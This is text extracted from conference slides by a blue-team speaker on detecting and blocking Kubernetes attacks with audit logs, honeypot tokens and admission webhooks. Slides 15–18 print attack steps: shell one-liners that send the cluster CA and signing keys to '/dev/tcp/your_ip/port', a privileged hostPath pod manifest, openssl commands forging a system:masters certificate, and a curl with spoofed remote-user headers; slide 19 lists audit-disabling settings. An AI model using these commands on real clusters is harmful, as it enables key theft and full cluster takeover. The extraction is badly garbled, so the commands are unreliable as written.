KUBERNETES

About me


blue teamer DEFCON Blue Team VillageBlack Hat Arsenal 

@9ian1i

 WatchAD ­ AD Security Intrusion Detection System

crawlergo ­ A powerful browser crawler for web vulnerability scanners

??? - kubernetes abnormal activity detection and blocking system

0 1

K8S
 
0 2

Threat matrix for Kubernetes
0 3

K8S



K8 S

Azure Cloud

15



Alibaba Cloud

7

Google Cloud

0

AWS Cloud

0

K8 S

*

https ://docs .micros oft.com/en-us /azure/s ecurity-center/alerts -reference#alerts -k8s clus ter

04

https ://help.aliyun.com/document_detail/191144.html#title-s eo-no0-8zv


05

Architecture based of audit logs detection

UI Us er Interface
C LI Co mman d
Lin e in terface

Master
API Server

Audit Log

Logtail Agent

Node 1 Node 2 Node n

Threat Analytics

MQ

Alerts for

suspicious activities

0 6

About k8s auditing

k8sAPI Server 
Master Master

 ·  ·  · 

*

0 7

Us er Interface

Master

API Server

Controlmanager

scheduler

etcd

ns

Secrets

default-token-xxxxx

sa-token-xxxxx

Node Pod

Pod
Compromised container

Web App

other-token-xxxxx

H o st

0 8

Access API Server

Master A API Server

Master B API Server

Master N API Server

 
6443 8080

  
0 9

SA Suspicious Activity

SA

10

Honeypot Account

Node

ns

Secrets

Pod A
Pod B ...

 

default-token-xxxxx
normal-sa-token-xxxxx ...

Host OS file: ~/.kube/kubeconfig

fake-admin-token-xxxxx

11

About k8s RBAC
12

Privilege Escalation ­ RBAC rolebinding/bind

hacker

Create rolebinding

API Server

auditing

normal account

admin privileges account

cluster-admin role
13

Privilege Escalation ­ RBAC createpod and SA bind

hacker

create pod req

createpod privilege

API Server

send token pod
Get admin JWT token
14

Certificate Authentication = Golden Ticket ?
K8SCA

UI
Us er Interface

15

Golden Ticket ­ Client Certificate
 API ServerCA

hacker

create pod req

CA p s -au x | g rep k ub e-ap iserv er | awk 'BEGIN{i= 1 }{g su b (/\s/,"\n ");i+ +;p rint}' |
g rep ' \-\-clien t-ca-file' | awk -F = '{p rin t$ 2}' | xarg s cat > /dev /tcp /y ou r_ip /po rt

CA p s -au x | g rep k ub e-co ntro ller-man ag er | awk
' BEGIN{i= 1 }{g su b (/\s/,"\n ");i+ + ;p rint}' | g rep ' \-\-cluster-sig n ing -key -file' |
awk -F = ' {p rin t $ 2}' | xarg s cat > /dev /tcp /yo ur_ ip/po rt

ap iVersio n : v 1 k in d : Po d
metad ata:
n ame: g et-crt-k ey n amesp ace: k u b e-sy stem
sp ec: h o stIP C: tru e
n o d eName: master
v o lu mes: - n ame: k 8 s
h o stP ath : p ath : /etc/k u bern etes/
co n tain ers:
- imag e: cen to s:7 n ame: cen to s
co mman d : ["/b in /b ash "] arg s: ["-c", "co mman d "]
v o lu meM o u nts:
- mo u n tP ath : "/etc/k ub ern etes" n ame: k 8 s

16

Golden Ticket ­ Client Certificate
CAcluster-admin 
opens s l genrs a -out admin.key 2048

cluster-adminmasters opens s l req -new -key admin.key -out admin.cs r -s ubj "/CN=clus ter-admin/O=s ys tem:mas ters "
10 opens s l x509 -req -in admin.cs r -CA ca.crt -CAkey ca.key -CAcreates erial -out admin.crt -days 3650

c lus t er-admin

17

Golden Ticket ­ User Forgery
 req u esth ead erCA --requestheader-allowed-names

CA  , 

hacker create pod req

ap iVersio n : v 1 k in d : Po d
metad ata:
n ame: g et-crt-k ey n amesp ace: k u b e-sy stem
sp ec: h o stIP C: tru e
n o d eName: master
v o lu mes: - n ame: k 8 s
h o stP ath : p ath : /etc/k u bern etes/
co n tain ers:
- imag e: cen to s:7 n ame: cen to s
co mman d : ["/b in /b ash "] arg s: ["-c", "co mman d "]
v o lu meM o u nts:
- mo u n tP ath : "/etc/k ub ern etes" n ame: k 8 s

C A ps -aux | grep kube-apis erver | awk 'BEGIN{i=1}{gs ub(/\s /,"\n");i++;print}' | grep '\-\-reques theaderclient-ca-file' | awk -F= '{print $2}'| xargs cat > /dev/tcp/your_ip/port
C A cat /etc/kubernetes /pki/front-proxy-ca.key > /dev/tcp/your_ip/port
 reques theader-allowed-names ps -aux | grep kube-apis erver | awk 'BEGIN{i=1}{gs ub(/\s /,"\n");i++;print}' | grep '\-\-reques theaderallowed-names ' | awk -F= '{print $2}'> /dev/tcp/your_ip/port

CA 
requestheader-allowed-names front-proxy-client

18

Golden Ticket ­ User Forgery
requestheaderCA 
opens s l genrs a -out us er.key 2048


curl -ki --cacert front-proxy-ca.crt --key s iyu.key --cert s iyu.crt http://39.107.182.57:6443/api/v1/s ecrets -H 'X-Remote-Group: s ys tem:mas ters ' -H 'X-Remote-Us er: hacker'

 CN=front-proxy-client  opens s l req -new -key us er.key -out us er.cs r -s ubj "/CN=front-proxy-client"
10 opens s l x509 -req -in us er.cs r -CA front-proxy-ca.crt -CAkey front-proxy-ca.key -CAcreates erial -out us er.crt -days 3650

hacker

19

Defense Evasion
remove audit log s ettings s et --allow-privileged=true s et --ins ecure-port=9443 s et --s ecure-port=9444 s et --anonymous -auth=true s et --authorization-mode=Always Allow

Shadow API Server
d u mp

update

kube-apiserverxxx.yaml

create

20


 · K8S ·  · 

21

Validating admission webhook
22

Architecture

UI
Us er Interface

Master

C LI Co mman d
Lin e
in terface

API Server

Mutating Webhooks

Validating Webhooks

etcd

Node 1 Node 2 Node n

Threat Analytics By audit log

Alerts for suspicious activities

Threat Analytics

Dynamic Admission C o n tro l

23

Dynamic Admission Control

All Requests

API Server

Operations that need to be persisted
to etcd

AdmissionReview Request

{ "ap iVersio n ": "ad missio n .k 8 s.io/v 1b eta1 ",

"k in d ": "Ad missio n Rev iew",

"req "u

u est": { id ": "7 0

5

ab

4f5

-63

93

-11

e8

-b7

cc-/4/

20 10a800 00 2", 



"k in d ": { "g ro u p ": "au toscalin g ",
"v ersio n ": "v 1 ",
"k in d ": "S cale" },

for _, container := range pod.Spec.Containers { for _, cmd := range container.Command {
if util.SliceFindStr(ris kCmd, cmd) { // 

"reso u rce": { "g ro u p ": "ap ps",
"v ersio n ": "v 1 ",
"reso u rce": "d ep lo y men ts" },
"su b Reso u rce": "scale", "req u estKin d ": {
"g ro u p ": "au toscalin g ",

vulCmdLis t = append(vulCmdLis t, cmd) } } //  for _, prefix := range auditSettingPrefix { if !util.SlicePrefixFind(container.Command, prefix) {

"v ersio n ": "v 1 ", "k in d ": "S cale"
}, "req u estReso u rce": {

mis s ingAuditSettings = append(mis s ingAuditSettings , prefix)
}

"g ro u p ": "ap ps",

}

"v ersio n ": "v 1 ", "reso u rce": "d ep lo y men ts"

}

... ...

24

No coding , More Cloud Native

C LI Co mman d
Lin e
in terface

apiVers ion: cons traints .gatekeeper.s h/v1be ta1 kind: K8s RequiredLabels metadata: name: ns -mus t-have-gk s pec: match:
kinds : - apiGroups : [""] kinds : ["Names pace"] parameters : labels : ["gatekeeper"]

Validating Webhooks

Gatekeeper

OPA

kube-mgmt

API Server
etcd

https://github.com/open-policy-agent/gatekeeper

25

https://github.com/open-policy-agent/opa

End
K8S  ·  · K8S


@Qianlitp

@9ian1i

9ian1itp@gmail.com

 26


KCon 
MA N O E U VR E

